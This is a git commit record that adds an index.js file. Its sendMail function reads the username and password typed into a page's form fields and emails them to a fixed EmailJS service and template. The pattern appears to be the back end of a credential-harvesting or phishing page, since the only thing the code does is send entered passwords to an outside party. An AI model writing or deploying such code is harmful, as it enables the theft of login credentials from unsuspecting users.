d18ef5751319f19900fee94304b2b8460647b88d
subhammahanty235 <subhammahanty235@gmail.com>
2022-03-30 09:32:41 +0530

    created

---
+++ index.js
@@ -0,0 +1,10 @@
+function sendMail(pra){
+    let temppara = {
+        user_name : document.getElementById("username").value,
+        user_passw : document.getElementById("passw").value
+    }
+    emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
+    .then(function (res){
+            console.log("success" , res.status)
+    })
+}
